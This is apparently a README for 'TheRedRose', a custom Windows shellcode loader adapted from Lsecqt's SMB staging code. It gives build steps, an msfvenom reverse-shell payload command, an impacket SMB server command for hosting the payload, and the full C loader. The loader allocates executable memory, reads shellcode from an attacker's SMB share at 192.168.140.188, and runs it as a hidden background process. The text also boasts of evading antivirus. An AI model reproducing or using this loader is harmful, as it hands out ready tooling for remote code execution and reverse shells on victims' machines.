# TheRedRose
A custom verion of shellcode loader Lsecqt based on SMB
Please see original version https://github.com/lsecqt/OffensiveCpp/blob/main/Techniques/SMB_Staging.c

# Easy compile
You can edit the rc file for edit it as u whis
```
./build.sh                                                   
[INFO] Compiling resources.rc into resources.o...
[SUCCESS] Compilation of resources.rc completed successfully.
[INFO] Compiling the main program with resources.o...
[INFO] Compilation of the main program completed successfully.
[SUCCESS] Compilation finished. The executable has been created as TheRedRose.exe
```
or you can simple compile the source code
```
x86_64-w64-mingw32-gcc -o background_app.exe your_code.c -mwindows
```

# How it work?
Two important variable in the code TheRedRose.c, the size of payload and the ip of smbserver

### Size of payload
I used Havoc C2 in my code but thats an example for msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=wlan0 lport=9001 -f raw > 9001.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes

unsigned char buf[460] = "";
```
### Change path of payload
In my example:
192.168.14.188 is the ip of attacker maching in my lab
code.bin is the payload name
```
readBin("\\\\192.168.140.188\\share\\code.bin");
```
For start the smbserver
(is important that in the same folder we have our payload)
```
impacket-smbserver share . -ts -debug -smb2support
```
# Whats change from the original code
This is a simple custom shellcode loader, so its not so different
1) This application create a background service so we dont need to take terminal open on the victim machine
2) Is customizabile using .rc file
3) Semplification of the code

# Detection
This is pretty hard to detect, but thats depends a lot by payload used for now only norton 360 was able to detect it could be a malware

# Code explanation
(very quick, u can see the original video if lsecqt for more info https://www.youtube.com/watch?v=w_NKshRQ3b8)
## Function readBin
```
void readBin(const char* fileName) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD bytesRead;
    BOOL result = ReadFile(hFile, buf, sizeof(buf), &bytesRead, NULL);
    if (!result) {
        CloseHandle(hFile);
        return;
    }

    CloseHandle(hFile);
}

```
* The readBin function opens a binary file for reading.
* CreateFileA opens the file specified by fileName for reading. If the file cannot be opened, the function exits.
* ReadFile reads the content of the file into the buffer buf. If the read operation fails, the file is closed and the function exits.
* Finally, the file is closed.

## Function WinMain
```
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    LPVOID pAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    readBin("\\\\192.168.140.188\\share\\code.bin");
    memcpy(pAddr, buf, sizeof(buf));
    ((void(*)())pAddr)();

    return 0;
}
```
* WinMain is the main entry point for a Windows application.
* VirtualAlloc allocates executable memory of the same size as the buffer buf.
* readBin("\\\\192.168.140.188\\share\\code.bin"); reads the binary file from a network location and fills the buffer buf with the file's data.
* memcpy(pAddr, buf, sizeof(buf)); copies the data from the buffer buf to the allocated memory pAddr.
* ((void(*)())pAddr)(); executes the binary code that was loaded into pAddr.
* Finally, the program terminates by returning 0.


Thanks Lsecqt for the main code 
https://github.com/lsecqt
